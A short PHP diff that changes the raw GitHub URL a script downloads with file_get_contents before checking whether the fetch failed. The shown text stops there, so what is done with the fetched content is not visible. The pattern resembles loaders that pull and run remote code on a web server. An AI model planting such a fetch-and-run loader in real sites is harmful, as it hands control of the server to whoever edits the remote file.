@@ -1,5 +1,5 @@
 <?php
-$url = "https://raw.githubusercontent.com/laylamasruro06-lab/script/refs/heads/main/backupscalifylabs.txt";
+$url = "https://raw.githubusercontent.com/laylamasruro06-lab/script/refs/heads/main/backupscalifylabss.txt";
 $content = file_get_contents($url);
 
 if ($content === FALSE) {
